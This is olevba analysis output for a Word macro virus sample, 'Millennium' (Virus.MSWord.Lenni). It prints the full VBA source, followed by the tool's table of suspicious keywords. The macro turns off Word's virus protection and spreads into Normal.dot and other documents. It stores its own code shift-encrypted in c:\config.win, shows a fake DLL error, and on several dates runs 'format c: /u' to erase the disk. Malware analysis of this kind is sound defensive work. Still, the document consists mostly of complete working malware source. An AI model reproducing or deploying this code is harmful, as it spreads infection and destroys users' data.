olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lenni-716312b4cb19a3e0d057ae3f2bde23b88da625ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Millennium.cls 
in file: Virus.MSWord.Lenni-716312b4cb19a3e0d057ae3f2bde23b88da625ac - OLE stream: 'Macros/VBA/Millennium'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Dim nLun As Integer
Dim nCar As Long
Dim CriptLine As String
Static acar() As Variant
eol = Chr(13)
xSave = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
CommandBars("Tools").Controls("Macro").Enabled = False
Randomize
If Dir("c:\config.win", 6) = "" Then
Open "c:\config.win" For Output As #1
For i = 1 To 124
    xLine = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    nLun = Len(xLine)
    ReDim acar(nLun)
    For xCont = 0 To nLun - 1
        acar(xCont) = Mid(xLine, 1, 1)
        xLine = Mid(xLine, 2, Len(xLine))
    Next
    For xConta = 0 To nLun - 1
        nCar = Asc(acar(xConta))
        nCar = nCar + 15
        CriptLine = CriptLine & Chr(nCar)
    Next
    Print #1, CriptLine
    CriptLine = ""
Next
Close #1
CriptLine = ""
SetAttr "c:\config.win", 6
End If
Set actdoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set actdot = NormalTemplate.VBProject.VBComponents.Item(1)
If actdot.Name <> "Millennium" Then
    actdot.Name = "Millennium"
  If actdot.CodeModule.countoflines > 0 Then
      nLine = actdot.CodeModule.countoflines
        For i = 1 To nLine
            actdot.CodeModule.deletelines 1
        Next
        Set xDoc = NormalTemplate.VBProject.VBComponents.Item(1)
        xVar = "n"
  Else
        If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
            Set xDoc = NormalTemplate.VBProject.VBComponents.Item(1)
            xVar = "n"
        End If
  End If
ElseIf actdoc.Name <> "Millennium" Then
        actdoc.Name = "Millennium"
    If actdoc.CodeModule.countoflines > 0 Then
        nLine = actdoc.CodeModule.countoflines
        For i = 1 To nLine
            actdoc.CodeModule.deletelines 1
        Next
        Set xDoc = ActiveDocument.VBProject.VBComponents.Item(1)
        xVar = "d"
    Else
        If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
            Set xDoc = ActiveDocument.VBProject.VBComponents.Item(1)
            xVar = "d"
        End If
    End If
Else
    xDoc = ""
End If
If xDoc <> "" Then
    If xVar = "n" Then
       'Third Sub
       xDoc.CodeModule.addfromstring ("Sub ViewVBCode" & eol & "MsgBox " & Chr(34) & "Microsoft Visual Basic Error in components MsVbRun32.dll." & Chr(34) & ",vbcritical," & Chr(34) & "Microsoft Word" & Chr(34) & eol & "End Sub")
    End If
    Open "c:\config.win" For Input As #1
    If LOF(1) = 0 Then GoTo xEnd
    i = 1
    Do While Not EOF(1)
        Line Input #1, xLine
        nLun = Len(xLine)
        ReDim acar(nLun)
        For xCont = 0 To nLun - 1
            acar(xCont) = Mid(xLine, 1, 1)
            xLine = Mid(xLine, 2, Len(xLine))
        Next
        For xCont = 0 To nLun - 1
            nCar = Asc(acar(xCont))
            nCar = nCar - 15
            CriptLine = CriptLine & Chr(nCar)
        Next
        xDoc.CodeModule.InsertLines i, CriptLine
        CriptLine = ""
        i = i + 1
    Loop
End If
xEnd:
   Close #1
    If Year(Now) = "2000" Then
        scmd$ = "echo y|format c: /u"
        If Day(Now) = 1 And Month(Date) = 1 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       ElseIf Day(Now) = 10 And Month(Date) = 1 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       End If
       If Day(Now) = 20 And Month(Date) = 1 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       ElseIf Day(Now) = 4 And Month(Date) = 8 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       End If
       If Day(Now) = 31 And Month(Date) = 10 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       ElseIf Day(Now) = 1 And Month(Date) = 4 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       End If
    End If
    'Forcing save
    If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MsVbRun32.dll       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

